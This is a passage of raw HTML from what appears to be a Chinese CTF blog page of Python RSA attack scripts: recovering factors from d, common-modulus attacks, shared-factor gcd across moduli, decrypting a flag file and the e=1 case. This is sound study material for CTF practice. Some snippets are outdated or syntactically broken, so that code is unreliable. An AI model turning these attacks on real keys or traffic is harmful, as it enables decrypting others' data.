data-num=\"8\"></td><td><pre>            p <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gcd<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">if</span> p <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> n <span class=\"token operator\">//</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        g <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>next_prime<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">0x75be564267f8bf6c2038dd0cadfeecbc3158acfc27e679dd0bdb0db0e90bd5198a0a7edc0626f357a2d75f3c37ede045b7f7ca6bda79e5bf6fc0aea0aa7beda587388599d2b77b538fc3e666784493ffaf731e2ae232e8e9e9f9f2a4df25c19b7680f5bf6c485bd87923f01c17d8ec35438772c28e361774e6e7681d67ecbe19</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">0x14b367bf01efd4dc667b8e62975479c612c96e78f7f1f55242b2973c882ddcb33a65c52174d8ae1273764ce429054ea3f2fdc38ff205443c92ef4198739f05aa11fc10d3fc6ff30c8f5f05a04f43e3d8fc9bfffe916b2e0360560a162729e91b7775bda70177e0f875626e0a81bd4eacea9948b02232a82659f8d9aa9b4c754f</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    d <span class=\"token operator\">=</span> <span class=\"token number\">105446909057629013379692394355251350740773777593653963988108428818399001716079</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Factorize<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"共模攻击nm相同ce不同\"><a class=\"anchor\" href=\"#共模攻击nm相同ce不同\">#</a> 共模攻击 (n,m 相同，c,e 不同)</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> n2s<span class=\"token punctuation\">,</span>s2n</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> invert</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">egcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">if</span> a <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    g<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">=</span> egcd<span class=\"token punctuation\">(</span>b <span class=\"token operator\">%</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">//</span> a<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  n <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  c1 <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  c2 <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  e1 <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  e2 <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  s <span class=\"token operator\">=</span> egcd<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  s1 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  s2 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span> s1<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    s1 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> s1</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    c1 <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">elif</span> s2<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    s2 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> s2</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    c2 <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>s1<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>s2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"共模攻击分解e1e2并爆破判别\"><a class=\"anchor\" href=\"#共模攻击分解e1e2并爆破判别\">#</a> 共模攻击（分解 e1e2 并爆破判别）</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n<span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c1<span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c2<span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e1e2<span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rsa_gong_N_def</span><span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span>e2<span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#共模攻击函数</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    e1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">,</span> n<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>e2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e1,e2:\"</span><span class=\"token punctuation\">,</span>e1<span class=\"token punctuation\">,</span>e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    s <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mpz:\"</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    s1 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    s2 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> s1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> s1</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        c1 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">elif</span> s2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> s2</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        c2 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>s1<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2 <span class=\"token punctuation\">,</span>s2 <span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">de</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#因为此时的 m 不是真正的 m，而是 m^k，所以对 m^k 进行爆破</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">while</span> k<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#指定 k 小于 1000</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        mk <span class=\"token operator\">=</span> c <span class=\"token operator\">+</span> n<span class=\"token operator\">*</span>k</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        flag<span class=\"token punctuation\">,</span> true1 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>mk<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回的第一个数值为开方数，第二个数值为布尔型，可整除为 true，可自行测试</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token boolean\">True</span> <span class=\"token operator\">==</span> true1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token comment\"># print(libnum.n2s(int(flag)))</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        k <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> e1 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>e1e2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span> e1e2<span class=\"token operator\">%</span>e1<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>         <span class=\"token comment\">#爆破可整除的 e</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        e2<span class=\"token operator\">=</span>e1e2<span class=\"token operator\">//</span>e1</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        c<span class=\"token operator\">=</span>rsa_gong_N_def<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        e<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span>e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        m1<span class=\"token operator\">=</span>de<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">if</span> m1<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#指定输出 m1</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"em相同存在两个n有公约数\"><a class=\"anchor\" href=\"#em相同存在两个n有公约数\">#</a> e,m 相同，存在两个 n 有公约数</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> invert<span class=\"token punctuation\">,</span> iroot</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2 <span class=\"token keyword\">as</span> gp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> xgcd<span class=\"token punctuation\">,</span> invmod</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i<span class=\"token operator\">&lt;></span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            pub_p<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pub_p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;></span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">></span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token keyword\">print</span> i</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span> j</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">print</span> pub_p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                a<span class=\"token operator\">=</span>i<span class=\"token punctuation\">,</span>p<span class=\"token operator\">=</span>pub_p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>q<span class=\"token operator\">=</span>a<span class=\"token operator\">/</span>p</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>q <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>e <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>c <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"根据enc文件pqe求d和key\"><a class=\"anchor\" href=\"#根据enc文件pqe求d和key\">#</a> 根据 enc 文件，p,q,e 求 d 和 key</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> rsa</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">285960468890451637935629440372639283459</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">304008741604601924494328155975272418463</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>key <span class=\"token operator\">=</span> rsa<span class=\"token punctuation\">.</span>PrivateKey<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.enc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rsa<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"根据pem文件解密\"><a class=\"anchor\" href=\"#根据pem文件解密\">#</a> 根据 pem 文件解密</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hhY3VvLm5ldC9jcnlwdHJzYXB1YmtleQ==\">RSA public key encryption and decryption</span></p>\n<p>or 用 kali 跑 openssl</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NsaWZmb3JkUi9hcnRpY2xlL2RldGFpbHMvODI3NDcxMTI=\">RSA 解密 - 提供 enc 和 pem 文件类</span></p>\n<h1 id=\"e1\"><a class=\"anchor\" href=\"#e1\">#</a> e=1</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>N_hex<span class=\"token operator\">=</span><span class=\"token number\">0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e_hex<span class=\"token operator\">=</span><span class=\"token number\">0x1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c_hex<span class=\"token operator\">=</span><span class=\"token number\">0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c_hex <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span>c_hex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>N_hex <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span>N_hex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token 